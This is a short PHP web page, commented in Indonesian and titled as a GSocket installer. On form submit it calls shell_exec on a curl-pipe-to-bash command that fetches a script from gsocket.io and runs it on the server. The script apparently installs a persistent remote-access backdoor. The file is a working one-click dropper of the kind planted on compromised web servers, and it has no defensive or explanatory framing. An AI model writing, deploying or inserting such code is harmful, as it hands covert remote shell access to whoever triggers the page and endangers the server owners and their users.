<?php

// Variabel untuk menyimpan output
$gsocket_output = "";

// Mengecek jika form disubmit (tombol ditekan)
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Perintah yang akan dijalankan untuk mengunduh dan menjalankan GSocket
    $command = 'bash -c "$(curl -fsSL https://gsocket.io/y)"';
    
    // Jalankan perintah dan simpan outputnya
    $gsocket_output = shell_exec($command);
}

?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instalasi GSocket</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 600px;
        }
        h2 {
            color: #333;
            text-align: center;
        }
        .output {
            margin-top: 15px;
            padding: 15px;
            background-color: #e0f7fa;
            border-radius: 4px;
            color: #00695c;
            white-space: pre-wrap;
            font-size: 14px;
        }
        .btn {
            background-color: #00796b;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            margin-top: 20px;
            text-align: center;
        }
        .btn:hover {
            background-color: #004d40;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Instalasi GSocket</h2>

    <!-- Form untuk memulai instalasi GSocket -->
    <form method="POST">
        <button type="submit" class="btn">Mulai Instalasi GSocket</button>
    </form>

    <!-- Menampilkan hasil output dari instalasi jika ada -->
    <?php if ($gsocket_output): ?>
        <div class="output">
            <?php echo nl2br(htmlspecialchars($gsocket_output)); ?>
        </div>
    <?php endif; ?>
</div>

</body>
</html>